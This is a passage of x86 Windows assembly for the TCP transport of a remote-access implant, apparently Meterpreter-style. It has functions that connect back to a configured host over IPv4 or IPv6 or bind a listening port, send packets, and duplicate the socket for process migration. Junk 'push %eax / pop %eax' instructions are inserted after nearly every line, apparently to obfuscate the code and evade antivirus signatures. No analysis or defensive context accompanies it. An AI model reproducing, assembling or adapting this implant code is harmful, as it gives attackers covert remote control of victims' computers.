	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC40, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L120
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L121
push %eax
pop %eax
	movl	$LC41, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__closesocket@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L120
push %eax
pop %eax
L121:
	movl	$LC42, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$_cleanup_socket@4, (%esp)
push %eax
pop %eax
	call	_thread_create
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_thread_run
push %eax
pop %eax
L120:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$0, (%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC43, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L122:
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC44:
	.ascii "[TCP] Connection already running on %u\0"
LC45:
	.ascii "[TCP CONFIGURE] Url: %S\0"
LC46:
	.ascii "tcp\0"
LC47:
	.ascii "//\0"
	.align 4
LC48:
	.ascii "[STAGELESS] IPv6 host %s port %S scopeid %S\0"
LC49:
	.ascii "[STAGELESS] IPv4 bind port %s\0"
	.align 4
LC50:
	.ascii "[STAGELESS] IPv4 host %s port %s\0"
	.align 4
LC51:
	.ascii "[SERVER] Something went wrong %u\0"
	.align 4
LC52:
	.ascii "[SERVER] Looking good, FORWARD!\0"
	.text
	.def	_configure_tcp_connection;	.scl	3;	.type	32;	.endef
_configure_tcp_connection:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$588, %esp
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L124
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC44, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L125
push %eax
pop %eax
L124:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	$511, 16(%esp)
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	$512, 8(%esp)
push %eax
pop %eax
	leal	-564(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	leal	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__wcstombs_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC45, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 64(%edx)
push %eax
pop %eax
	movl	$3, 8(%esp)
push %eax
pop %eax
	movl	$LC46, 4(%esp)
push %eax
pop %eax
	leal	-564(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strncmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L125
push %eax
pop %eax
	movl	$LC47, 4(%esp)
push %eax
pop %eax
	leal	-564(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strstr
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	$58, 4(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strrchr
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movzbl	-561(%ebp), %eax
push %eax
pop %eax
	cmpb	$54, %al
push %eax
pop %eax
	jne	L126
push %eax
pop %eax
	movl	$63, 4(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strrchr
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	subl	$1, %eax
push %eax
pop %eax
	movb	$0, (%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	subl	$1, %eax
push %eax
pop %eax
	movb	$0, (%eax)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC48, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-32(%ebp), %edi
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %esi
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	56(%eax), %ebx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_atol
push %eax
pop %eax
	movl	%edi, 20(%esp)
push %eax
pop %eax
	movl	%esi, 16(%esp)
push %eax
pop %eax
	movl	%ebx, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_reverse_tcp6
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	jmp	L125
push %eax
pop %eax
L126:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_atoi
push %eax
pop %eax
	movw	%ax, -42(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	cmpb	$58, %al
push %eax
pop %eax
	jne	L127
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC49, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-32(%ebp), %edx
push %eax
pop %eax
	movzwl	-42(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_bind_tcp
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	jmp	L125
push %eax
pop %eax
L127:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	subl	$1, %eax
push %eax
pop %eax
	movb	$0, (%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC50, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-32(%ebp), %ebx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %ecx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	56(%eax), %edx
push %eax
pop %eax
	movzwl	-42(%ebp), %eax
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_reverse_tcp4
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
L125:
	cmpl	$0, -28(%ebp)
push %eax
pop %eax
	je	L128
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC51, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L129
push %eax
pop %eax
L128:
	movl	$LC52, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetHandleInformation@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 64(%edx)
push %eax
pop %eax
L129:
	movl	-28(%ebp), %eax
push %eax
pop %eax
	leal	-12(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%edi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC53:
	.ascii "[PACKET] transmit packet failed with return %d at index %d\12\0"
LC54:
	.ascii "[PACKET] Packet sent!\0"
	.text
	.globl	_packet_transmit_tcp
	.def	_packet_transmit_tcp;	.scl	2;	.type	32;	.endef
_packet_transmit_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_acquire
push %eax
pop %eax
	jmp	L132
push %eax
pop %eax
L133:
	movl	16(%ebp), %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__send@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	addl	%eax, -12(%ebp)
push %eax
pop %eax
L132:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	cmpl	16(%ebp), %eax
push %eax
pop %eax
	jb	L133
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	je	L134
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC53, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L135
push %eax
pop %eax
L134:
	movl	$LC54, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L135:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_release
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_transport_write_tcp_config
	.def	_transport_write_tcp_config;	.scl	2;	.type	32;	.endef
_transport_write_tcp_config:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L139
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L139
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	52(%eax), %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 1024(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	56(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 1028(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 1032(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	44(%eax), %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$512, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_wcsncpy
push %eax
pop %eax
L139:
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_get_migrate_context_tcp;	.scl	3;	.type	32;	.endef
_get_migrate_context_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$388, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	call	_calloc
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	jne	L141
push %eax
pop %eax
	movl	$14, %eax
push %eax
pop %eax
	jmp	L142
push %eax
pop %eax
L141:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leal	16(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	48(%eax), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WSADuplicateSocketA@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L143
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	__imp__WSAGetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	jmp	L142
push %eax
pop %eax
L143:
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	$388, (%eax)
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L142:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_transport_get_config_size_tcp;	.scl	3;	.type	32;	.endef
_transport_get_config_size_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	movl	$1036, %eax
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC55:
	.ascii "[TRANS TCP] Creating tcp transport for url %S\0"
	.text
	.globl	_transport_create_tcp
	.def	_transport_create_tcp;	.scl	2;	.type	32;	.endef
_transport_create_tcp:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	$76, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	$8, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L147
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$1036, (%eax)
push %eax
pop %eax
L147:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC55, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$76, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	$8, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$1, (%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	1024(%eax), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 52(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	1028(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 56(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	1032(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 60(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___wcsdup, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 44(%edx)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_packet_transmit_tcp, 36(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_configure_tcp_connection, 20(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_transport_destroy_tcp, 28(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_transport_reset_tcp, 16(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_server_dispatch_tcp, 32(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_transport_get_handle_tcp, 4(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_transport_set_handle_tcp, 8(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	-16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%eax)
push %eax
pop %eax
	call	_current_unix_timestamp
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 64(%edx)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_get_migrate_context_tcp, 40(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$_transport_get_config_size_tcp, 12(%eax)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_sleep;	.scl	2;	.type	32;	.endef
	.def	_lock_acquire;	.scl	2;	.type	32;	.endef
	.def	_lock_release;	.scl	2;	.type	32;	.endef
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.def	_decrypt_packet;	.scl	2;	.type	32;	.endef
	.def	_pivot_tree_find;	.scl	2;	.type	32;	.endef
	.def	_pivot_packet_dispatch;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_event_poll;	.scl	2;	.type	32;	.endef
	.def	_command_handle;	.scl	2;	.type	32;	.endef
	.def	_thread_destroy;	.scl	2;	.type	32;	.endef
	.def	_thread_create;	.scl	2;	.type	32;	.endef
	.def	_thread_run;	.scl	2;	.type	32;	.endef
	.def	_strncmp;	.scl	2;	.type	32;	.endef
	.def	_strstr;	.scl	2;	.type	32;	.endef
	.def	_strrchr;	.scl	2;	.type	32;	.endef
	.def	_atol;	.scl	2;	.type	32;	.endef
	.def	_atoi;	.scl	2;	.type	32;	.endef
	.def	_wcsncpy;	.scl	2;	.type	32;	.endef
	.def	_calloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
